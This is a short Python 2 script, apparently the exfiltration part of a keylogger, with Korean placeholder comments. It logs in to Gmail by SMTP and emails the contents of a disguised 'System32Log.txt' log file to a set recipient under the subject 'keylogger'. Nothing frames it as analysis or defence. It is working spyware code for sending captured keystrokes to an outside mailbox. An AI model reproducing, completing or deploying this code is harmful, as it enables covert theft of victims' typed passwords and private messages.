# -*- coding:utf-8 -*-
import os 
import smtplib
from email.MIMEMultipart import MIMEMultipart
from email.MIMEText import MIMEText
from email.MIMEImage import MIMEImage
from email.MIMEBase import MIMEBase
from email import Encoders



#Set up users for email
gmail_user = "내아이디@gmail.com"#보내는 메일주소
gmail_pwd = "비밀번호"
recipients = ['@gmail.com']#보낼 주소

#Create Module
def mail(to, subject, text, attach):
   msg = MIMEMultipart()
   msg['From'] = gmail_user
   msg['To'] = ", ".join(recipients)
   msg['Subject'] = subject

   msg.attach(MIMEText(file("경로\System32Log.txt").read()))



   mailServer = smtplib.SMTP("smtp.gmail.com", 587)
   mailServer.ehlo()
   mailServer.starttls()
   mailServer.ehlo()
   mailServer.login(gmail_user, gmail_pwd)
   mailServer.sendmail(gmail_user, to, msg.as_string())
   # Should be mailServer.quit(), but that crashes...
   mailServer.close()

#send it
mail(recipients,
    "keylogger",
   "Test email",
   "경로\System32Log.txt")
